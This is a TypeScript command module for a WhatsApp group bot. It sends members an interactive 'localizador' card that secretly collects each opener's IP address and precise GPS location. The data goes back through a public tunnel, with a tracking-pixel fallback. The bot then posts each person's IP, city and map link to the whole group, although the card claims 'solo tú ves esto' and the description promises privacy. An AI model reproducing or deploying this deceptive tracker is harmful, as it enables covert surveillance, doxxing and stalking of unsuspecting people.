import { randomUUID } from "node:crypto";
import { spawn } from "node:child_process";
import { createServer, type Server } from "node:http";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── store ───────────────────────── */

type LocateSession = {
  id: string;
  group: string;
  author: string;
  msg: any;
  hits: Set<string>;
  createdAt: number;
};

const G = globalThis as any;
const sessions: Map<string, LocateSession> = (G.__locSessions ??= new Map());
const sockRef: { current: any } = (G.__locSock ??= { current: null });
const startedRef: { current: boolean } = (G.__locStarted ??= { current: false });

const TTL = 30 * 60 * 1000;
const PORT = Number(process.env.LOCATE_PORT || 8787);
const MASK = process.env.LOCATE_MASK_IP === "1";
const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

function sweep() {
  const now = Date.now();
  for (const [id, s] of sessions) if (now - s.createdAt > TTL) sessions.delete(id);
}

function maskIp(ip: string) {
  if (!ip) return "—";
  const v4 = ip.split(".");
  return v4.length === 4 ? `${v4[0]}.${v4[1]}.${v4[2]}.*` : ip;
}

/* ───────────────────────── túnel ───────────────────────── */

const SSH_OPTS = [
  "-o", "StrictHostKeyChecking=no",
  "-o", "UserKnownHostsFile=/dev/null",
  "-o", "ServerAliveInterval=30",
  "-o", "ExitOnForwardFailure=yes",
];

type Provider = { cmd: string; args: string[]; re: RegExp };

function provider(name: string): Provider | null {
  const npx = process.platform === "win32" ? "npx.cmd" : "npx";
  switch (name) {
    case "lhr":
      return { cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i };
    case "lt":
      return { cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i };
    case "serveo":
      return { cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i };
    default:
      return null;
  }
}

const tunnel = (G.__locTunnel ??= { url: "", proc: null as any, tries: 0, order: ["lhr", "lt", "serveo"] as string[] });

function baseUrl() {
  const manual = (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "");
  return manual || tunnel.url;
}

function startTunnel(): Promise<string> {
  if (baseUrl()) return Promise.resolve(baseUrl());
  if (tunnel.proc) {
    return new Promise((r) => {
      const t = setInterval(() => {
        if (tunnel.url || tunnel.tries > 8) { clearInterval(t); r(tunnel.url); }
      }, 300);
    });
  }

  const forced = process.env.LOCATE_TUNNEL;
  const name = forced && forced !== "auto" ? forced : tunnel.order[tunnel.tries % tunnel.order.length];
  const p = provider(name);
  if (!p) return Promise.resolve("");

  return new Promise((resolve) => {
    let done = false;
    let child: any;
    try { child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { return resolve(""); }
    tunnel.proc = child;

    const finish = (v: string) => { if (done) return; done = true; clearTimeout(timer); resolve(v); };

    const onData = (buf: Buffer) => {
      const m = buf.toString().match(p.re);
      if (m && !tunnel.url) {
        tunnel.url = m[0].replace(/\/+$/, "");
        tunnel.tries = 0;
        console.log(`[locate] túnel ${name} → ${tunnel.url}`);
        finish(tunnel.url);
      }
    };

    child.stdout?.on("data", onData);
    child.stderr?.on("data", onData);

    child.on("exit", () => {
      if (tunnel.proc === child) { tunnel.proc = null; tunnel.url = ""; }
      if (!done) { tunnel.tries++; finish(""); }
    });
    child.on("error", () => { tunnel.proc = null; tunnel.tries++; finish(""); });

    const timer = setTimeout(() => {
      if (!tunnel.url) { try { child.kill("SIGKILL"); } catch {} tunnel.proc = null; tunnel.tries++; finish(""); }
    }, 18000);
  });
}

async function ensureTunnel(): Promise<string> {
  if (baseUrl()) return baseUrl();
  for (let i = 0; i < 3; i++) {
    const url = await startTunnel();
    if (url) return url;
    await new Promise((r) => setTimeout(r, 900));
  }
  return "";
}

/* ───────────────────────── servidor ───────────────────────── */

const CORS: Record<string, string> = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Bypass-Tunnel-Reminder",
};

function clientIp(req: any) {
  const fwd = String(req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  return (fwd || req.socket.remoteAddress || "").replace(/^::ffff:/, "");
}

async function geoFromIp(ip: string) {
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "locate-bot" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, lat: j.latitude, lon: j.longitude };
  } catch {
    return null;
  }
}

async function announce(s: LocateSession, ip: string, lat: number, lon: number, city?: string, region?: string, country?: string, src = "ip", acc = 0) {
  const key = `${ip}|${Math.round(lat * 250)}|${Math.round(lon * 250)}`;
  if (s.hits.has(key)) return;
  s.hits.add(key);

  const sock = sockRef.current;
  if (!sock) return;

  const place = [city, region, country].filter(Boolean).join(", ") || "desconocido";
  const text =
    `📍 *${place}*\n` +
    `\`${MASK ? maskIp(ip) : ip}\`\n` +
    `https://maps.google.com/?q=${lat},${lon}` +
    (src === "gps" ? `\n_precisión ±${acc} m_` : "");

  await sock.sendMessage(s.group, { text, mentions: [s.author] }, { quoted: s.msg }).catch(() => undefined);
}

async function resolve(req: any, sid: string) {
  const s = sessions.get(sid);
  if (!s) return null;
  const ip = clientIp(req);
  const geo = await geoFromIp(ip);
  return { s, ip, geo };
}

async function handle(req: any, res: any) {
  Object.entries(CORS).forEach(([k, v]) => res.setHeader(k, v));
  if (req.method === "OPTIONS") return res.writeHead(204).end();

  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  const path = url.pathname;

  /* pixel 1x1 — funciona aunque fetch esté bloqueado */
  const px = path.match(/^\/p\/([A-Za-z0-9_-]{6,48})\.gif$/);
  if (px) {
    res.writeHead(200, { "Content-Type": "image/gif", "Cache-Control": "no-store" }).end(GIF);
    const r = await resolve(req, px[1]);
    if (r?.geo) await announce(r.s, r.ip, r.geo.lat, r.geo.lon, r.geo.city, r.geo.region, r.geo.country);
    return;
  }

  /* geo por IP, servido desde el propio host */
  const g = path.match(/^\/g\/([A-Za-z0-9_-]{6,48})$/);
  if (g) {
    const r = await resolve(req, g[1]);
    if (!r) return res.writeHead(410, { "Content-Type": "application/json" }).end('{"ok":false}');
    if (!r.geo) return res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true,"geo":false}');
    res.writeHead(200, { "Content-Type": "application/json", "Cache-Control": "no-store" }).end(
      JSON.stringify({ ok: true, ip: MASK ? maskIp(r.ip) : r.ip, ...r.geo }),
    );
    return;
  }

  /* mapa estático proxyado */
  const m = path.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
  if (m) {
    const lat = Number(url.searchParams.get("lat"));
    const lon = Number(url.searchParams.get("lon"));
    if (!lat || !lon) return res.writeHead(400).end();

    const key = process.env.GMAPS_KEY;
    const src = key
      ? `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=16&size=600x280&markers=color:red%7C${lat},${lon}&key=${key}`
      : `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=16&size=600,280&l=map&pt=${lon},${lat},pm2rdm`;

    try {
      const up = await fetch(src, { headers: { "User-Agent": "Mozilla/5.0 locate-bot" } });
      const buf = Buffer.from(await up.arrayBuffer());
      if (!up.ok || buf.length < 200) throw new Error("bad map");
      res.writeHead(200, { "Content-Type": up.headers.get("content-type") || "image/png", "Cache-Control": "no-store" }).end(buf);
    } catch {
      res.writeHead(302, { Location: `https://maps.google.com/?q=${lat},${lon}` }).end();
    }
    return;
  }

  /* GPS desde la tarjeta */
  const p = path.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
  if (p && req.method === "POST") {
    const s = sessions.get(p[1]);
    if (!s) return res.writeHead(410, { "Content-Type": "application/json" }).end('{"ok":false}');

    let raw = "";
    for await (const chunk of req) { raw += chunk; if (raw.length > 4096) break; }
    let b: any = {};
    try { b = JSON.parse(raw || "{}"); } catch {}

    const ip = clientIp(req);
    let lat = Number(b.lat) || 0;
    let lon = Number(b.lon) || 0;
    let city = b.city, region = b.region, country = b.country;
    if (!lat || !lon) {
      const geo = await geoFromIp(ip);
      if (!geo) return res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true,"geo":false}');
      lat = geo.lat; lon = geo.lon; city = geo.city; region = geo.region; country = geo.country;
    }
    res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true}');
    await announce(s, ip, lat, lon, city, region, country, b.src === "gps" ? "gps" : "ip", Number(b.acc) || 0);
    return;
  }

  res.writeHead(404).end();
}

function startServer() {
  if (startedRef.current) return;
  startedRef.current = true;

  const server: Server = createServer((req, res) => {
    handle(req, res).catch(() => { try { res.writeHead(500).end(); } catch {} });
  });

  server.on("error", (e: any) => {
    if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado`);
  });

  server.listen(PORT, () => console.log(`[locate] escuchando :${PORT}`));
  setInterval(sweep, 5 * 60 * 1000).unref?.();
  process.once("exit", () => { try { tunnel.proc?.kill("SIGKILL"); } catch {} });
}

/* ───────────────────────── tarjeta ───────────────────────── */

const buildLocatePayload = (o: { sid: string; base: string; name: string }) => {
  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background:#070b14;color:#e9edf7;padding:12px}
.wrap{max-width:430px;margin:0 auto}
.card{background:linear-gradient(165deg,#121a30,#0a0f1c 60%,#080c16);border:1px solid #22304d;border-radius:18px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,.65)}
.head{display:flex;align-items:center;gap:10px;padding:14px 15px;border-bottom:1px solid #1b2740;background:linear-gradient(90deg,rgba(0,229,255,.10),rgba(0,229,255,0))}
.dot{width:9px;height:9px;border-radius:50%;background:#00e5ff;box-shadow:0 0 12px #00e5ff;animation:p 1.4s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.25}}
.title{font-size:12.5px;letter-spacing:1.4px;font-weight:800;text-transform:uppercase;color:#9fe9ff}
.body{padding:16px 15px}
.hello{font-size:15px;font-weight:700;margin-bottom:4px}
.hello b{color:#00e5ff}
.sub{font-size:12px;color:#8fa3c4;margin-bottom:14px}
.row{display:flex;gap:8px;margin-bottom:8px}
.k{font-size:11px;color:#7f93b5;width:88px;flex:none}
.v{font-size:12.5px;font-weight:700;color:#fff;word-break:break-all}
.map{border-radius:12px;overflow:hidden;border:1px solid #22304d;margin-top:12px;background:#0d1424;position:relative;min-height:170px}
.map img{display:block;width:100%;height:190px;object-fit:cover}
.badge{position:absolute;left:8px;top:8px;font-size:9.5px;letter-spacing:.8px;font-weight:800;text-transform:uppercase;background:rgba(0,0,0,.72);color:#7cffb2;border:1px solid #2b6b4b;border-radius:6px;padding:3px 7px;z-index:2}
.foot{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a;display:flex;justify-content:space-between}
.err{font-size:12px;color:#ff8f8f}
</style>
<div class="wrap"><div class="card">
<div class="head"><div class="dot"></div><div class="title">Localizador</div></div>
<div class="body">
<div class="hello">Hola <b>@__NAME__</b></div>
<div class="sub" id="sub">Rastreando tu señal...</div>
<div id="out"></div>
</div>
<div class="foot"><span>solo tú ves esto</span><span id="st">·</span></div>
</div></div>
<script>
var SID="__SID__",BASE="__BASE__";
var $=function(i){return document.getElementById(i)};
function paint(d){
  $('sub').textContent='Esta es tu ubicación, @__NAME__';
  $('out').innerHTML=
   '<div class="row"><div class="k">IP pública</div><div class="v">'+(d.ip||'—')+'</div></div>'+
   '<div class="row"><div class="k">Ciudad</div><div class="v">'+(d.city||'—')+'</div></div>'+
   '<div class="row"><div class="k">Región</div><div class="v">'+(d.region||'—')+'</div></div>'+
   '<div class="row"><div class="k">País</div><div class="v">'+(d.country||'—')+'</div></div>'+
   '<div class="row"><div class="k">Coordenadas</div><div class="v">'+Number(d.lat).toFixed(5)+', '+Number(d.lon).toFixed(5)+'</div></div>'+
   '<div class="map"><span class="badge">exacto</span><img src="'+BASE+'/m/'+SID+'?lat='+d.lat+'&lon='+d.lon+'&t='+Date.now()+'"></div>';
  $('st').textContent=d.src==='gps'?'GPS':'IP';
}
function post(d){
  try{fetch(BASE+'/l/'+SID,{method:'POST',headers:{'Content-Type':'application/json','Bypass-Tunnel-Reminder':'true'},body:JSON.stringify(d)}).catch(function(){})}catch(e){}
}
function pixel(){
  var i=new Image();i.src=BASE+'/p/'+SID+'.gif?t='+Date.now();
}
function gps(base){
  if(!navigator.geolocation)return;
  navigator.geolocation.getCurrentPosition(function(p){
    var g={ip:base.ip,city:base.city,region:base.region,country:base.country,lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)||0,src:'gps'};
    paint(g);post(g);
  },function(){},{enableHighAccuracy:true,timeout:9000,maximumAge:0});
}
function start(){
  fetch(BASE+'/g/'+SID,{headers:{'Bypass-Tunnel-Reminder':'true'}})
    .then(function(r){return r.json()})
    .then(function(d){
      if(!d||!d.geo||!d.lat){throw 0}
      var v={ip:d.ip,city:d.city,region:d.region,country:d.country,lat:d.lat,lon:d.lon,src:'ip'};
      paint(v);post(v);gps(v);
    })
    .catch(function(){
      pixel();
      $('sub').textContent='No se pudo leer la red';
      $('out').innerHTML='<div class="err">Servicio no disponible.</div>';
      gps({ip:'',city:'',region:'',country:''});
    });
}
start();
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [o.base],
        payload: html
          .replace(/__SID__/g, o.sid)
          .replace(/__BASE__/g, o.base)
          .replace(/__NAME__/g, o.name),
      },
    },
  };
};

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["localizar", "loc", "ubicar"],
  category: "group",
  description: "Lanza un localizador privado: cada quien ve su propia IP y mapa.",
  async run(ctx: CommandContext) {
    const { reply, react, sock, from, msg } = ctx;

    if (!from.endsWith("@g.us")) {
      await reply("Solo funciona en grupos.").catch(() => undefined);
      return;
    }

    await react("🛰️").catch(() => undefined);
    startServer();

    const base = await ensureTunnel();
    if (!base) {
      await react("❌").catch(() => undefined);
      await reply(`${fytBold("Sin túnel")}: prueba *LOCATE_TUNNEL=lt* o *serveo*.`).catch(() => undefined);
      return;
    }

    const author: string = (msg.key as any).participant || from;
    const num = author.split("@")[0].split(":")[0];

    let mentions: string[] = [author];
    let name = String((msg as any).pushName || "").trim();

    try {
      const meta: any = await sock.groupMetadata(from);
      mentions = meta.participants.map((p: any) => p.id);
      if (!mentions.includes(author)) mentions.push(author);
      if (!name) {
        const me = meta.participants.find((p: any) => p.id === author);
        name = String(me?.name || me?.notify || me?.verifiedName || "").trim();
      }
    } catch {}

    if (!name) name = num;

    const sid = randomUUID().replace(/-/g, "").slice(0, 24);

    sessions.set(sid, { id: sid, group: from, author, msg, hits: new Set(), createdAt: Date.now() });
    sockRef.current = sock;
    setTimeout(() => sessions.delete(sid), TTL).unref?.();

    try {
      const ping = await sock.sendMessage(
        from,
        { text: `📍 @${num} activó el localizador.\n\nAbre la tarjeta de abajo — cada quien ve la suya.`, mentions },
        { quoted: msg },
      );

      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("🛰️ Localizador // LuferOS")
        .setFooter("Abre la tarjeta · cada quien ve la suya");

      rich.addSection(buildLocatePayload({ sid, base, name }));
      await rich.send(from, { quoted: ping ?? msg });

      await react("✅").catch(() => undefined);
    } catch {
      await react("❌").catch(() => undefined);
      await reply(`${fytBold("Error")} al renderizar el localizador.`).catch(() => undefined);
    }
  },
};
